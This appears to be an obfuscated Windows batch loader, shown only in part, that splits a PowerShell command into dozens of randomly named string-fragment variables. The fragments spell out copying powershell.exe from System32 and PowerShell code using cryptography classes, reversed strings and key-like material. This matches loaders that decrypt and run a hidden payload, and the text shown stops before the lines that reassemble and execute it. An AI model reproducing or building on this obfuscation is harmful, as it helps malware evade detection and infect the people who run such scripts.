@echo off
set "WOCuDkNchH=\v"
set "ipUUeaqQCe=32"
set "uhwjrUiIoa=he"
set "EfHVdUwHRa=he"
set "nDSlqFzreK=we"
set "lrKBgKNMXq=in"
set "mTVXHZjjiL=st"
set "JtHeHvgHfb=ws"
set "hZzdPhVWiv=1."
set "rPliJikJWT=ow"
set "dsIWHxdYFN=\W"
set "oNUNfKjhOD=nd"
set "PvsSTYyAGP=Wi"
set "huzjSrfjJl=we"
set "tZFhKwbJAZ=:\"
set "EIEpoNspmb=ll"
set "MGWtNMZxWK=.e"
set "iPRHpsIwmC=py"
set "nTblzRFtOt=Po"
set "QUMgRXRflV= C"
set "xcfZeRJFTL=rS"
set "rFmztgAwOc=ll"
set "AflHxZYqSY=xe"
set "NODMyqRHZK=em"
set "iRzetSPGFX=0\"
set "yryvGFfSba=Sy"
set "NySqRWZaTG=do"
set "kDotUepxbL=rs"
set "LZlaYOkcvE=y "
set "EVnGAjUxed=co"
set "iwVJHBZYfg= /"
set "rYWnNuBTmT=s\"
set "qnRQOPDnsS=po"
set "ijkuFteEhL=cd"
set "TBxpZVebGR= %~dp0"
set "dCyVHOcIdt=ypto"
set "ECxCgLcPhP=$HYy"
set "kRdTBrepWs=urit"
set "gxRRHapNnV=gnir"
set "paPYstwWQk=();$"
set "oaeNfvxVpe=H.Su"
set "kgjcRGYnuv=HYyv"
set "VrYUJcrccP=)) {"
set "TNpTUjihKR=nirt"
set "BlMnNVRzoK=$HYy"
set "uXwCNzaROG=brea"
set "GwXUJewvXs=.Cop"
set "MGmZLcQbnM='')("
set "PwSSyHgUmX=pStr"
set "XRkYbSrLGP=vm ="
set "nBNUCNqeTF=null"
set "LzqaEvEakA=; };"
set "ZGdSXIBaYv=New-"
set "MxcndrQHVu== $J"
set "rKUowFzUrk=trea"
set "CGYoUEvFOB=Star"
set "ehjfdiQTZQ=-Obj"
set "RmcoUxNAPa=p = "
set "LiKRrgVxMK=File"
set "xbJAeKwZbc=tem."
set "kQGqhBrULL=th('"
set "eWlStPiSXJ=]::("
set "grxlOVVktB=oL'["
set "YNfoXKRGLd=;$Np"
set "jctvTZwbFb=] -j"
set "aNsgTetHxH=JrIj"
set "RGtJMSTJBI=Fo7l"
set "fMoNwMYSbk=6esa"
set "HvEPtSSMGe= = $"
set "tNUMVTGOPN=i.En"
set "trjhoSvpvn=eam("
set "gqgbKzLvvC=rans"
set "QwywqGiXJi=n ''"
set "ylCAKaKpwD=ct S"
set "jsfCBhJcYu=.Com"
set "xEFEliQajK=;$ma"
set "UXCggTyVdu=rt]:"
set "LlUSabsyyE=[]] "
set "yHRswjWgfb=Stre"
